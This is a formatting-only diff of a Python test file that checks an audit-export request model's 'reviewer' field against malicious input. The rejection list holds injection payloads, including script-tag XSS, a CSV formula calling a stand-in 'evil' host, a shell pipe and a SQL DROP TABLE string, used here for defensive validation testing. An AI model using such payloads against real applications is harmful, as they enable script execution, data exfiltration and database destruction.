@@ -34,10 +34,8 @@ for key in list(sys.modules):
         del sys.modules[key]
 sys.path.insert(0, str(service_dir))
 
-from pydantic import ValidationError
-
 from app.models import AuditExportRequest
-
+from pydantic import ValidationError
 
 BASE_OK = {"model_id": "risk-model-v1", "output_type": "regulator_examination_package"}
 
@@ -76,7 +74,7 @@ def test_reviewer_accepts_well_formed_values(reviewer: str) -> None:
         "Jane<script>",
         'Jane"</script><script>alert(1)</script>',
         "Jane & Mallory",  # ampersand is not in the whitelist
-        "=WEBSERVICE(\"http://evil/\")",  # CSV formula vector
+        '=WEBSERVICE("http://evil/")',  # CSV formula vector
         "+CMD()",
         "Jane|Mallory",  # shell-pipe
         "Jane;DROP TABLE users",
@@ -146,8 +144,6 @@ def test_reviewer_error_does_not_echo_payload() -> None:
         AuditExportRequest(**BASE_OK, reviewer=payload)
     # Pydantic includes the input in ``input`` field by default, but
     # the *message* text we author must not do its own echo.
-    message = "\n".join(
-        err.get("msg", "") for err in exc_info.value.errors()
-    )
+    message = "\n".join(err.get("msg", "") for err in exc_info.value.errors())
     assert "<script>" not in message
     assert "alert" not in message
